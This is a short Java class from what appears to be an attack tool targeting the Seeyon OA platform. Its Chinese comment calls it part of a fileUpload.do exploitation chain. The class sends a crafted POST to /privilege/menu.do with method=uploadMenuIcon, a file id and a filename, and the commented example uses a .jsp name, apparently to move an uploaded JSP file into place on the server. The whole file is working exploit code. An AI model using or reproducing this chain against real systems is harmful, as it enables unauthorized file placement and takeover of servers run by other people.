package com.droplab.Controller.Seeyon.Common;

import com.droplab.Utils.HttpUtils;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.Map;

/**
 * fileUpload.do利用链，通过 menu.do--uploadMenuIcon()方法去进行文件移动
 */
public class UploadMenuIconFile {
    private final String contentUrl = "/privilege/menu.do";

    private static UploadMenuIconFile uploadMenuIconFile = null;

    public static UploadMenuIconFile instance() {
        if (uploadMenuIconFile == null) {
            uploadMenuIconFile = new UploadMenuIconFile();
        }
        return uploadMenuIconFile;
    }

    public boolean UploadMenuIcon(String url, String fileid, String filename, Map headers){
        try {
            //method=uploadMenuIcon&fileid=-6224114779617146995&filename=ygvMNtkP1.jsp
            HashMap paramMap = new HashMap();
            paramMap.put("method","uploadMenuIcon");
            paramMap.put("fileid",fileid);
            paramMap.put("filename",filename);

            Connection.Response post = HttpUtils.post(headers, url + contentUrl, paramMap);
            return true;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }
}
